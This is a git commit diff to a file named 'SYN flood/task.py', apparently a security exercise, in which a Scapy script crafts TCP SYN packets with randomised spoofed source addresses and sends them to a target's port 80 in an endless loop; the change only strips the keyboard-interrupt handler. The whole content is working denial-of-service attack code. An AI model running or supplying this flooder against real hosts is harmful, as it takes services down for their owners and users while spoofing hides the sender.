f6c84e0d96d4c4acc3a9b5240c3b0909c07fb7c8
almogshabo3 <almogshabo18@gmail.com>
2026-01-18 11:26:27 +0200

    task.py

--- SYN flood/task.py
+++ SYN flood/task.py
@@ -6,8 +6,4 @@ target_port = 80
 ip = IP(src=RandIP(), dst=target_ip) 
 syn=TCP(sport=RandShort(), dport=target_port, flags="S")
 
-try:
-    send(ip/syn, loop=1, verbose=False)
-except KeyboardInterrupt:
-    print("\n[!] Attack stopped by user.")
-    print("[*] Cleaning up and exiting...")
+send(ip/syn, loop=1, verbose=False)
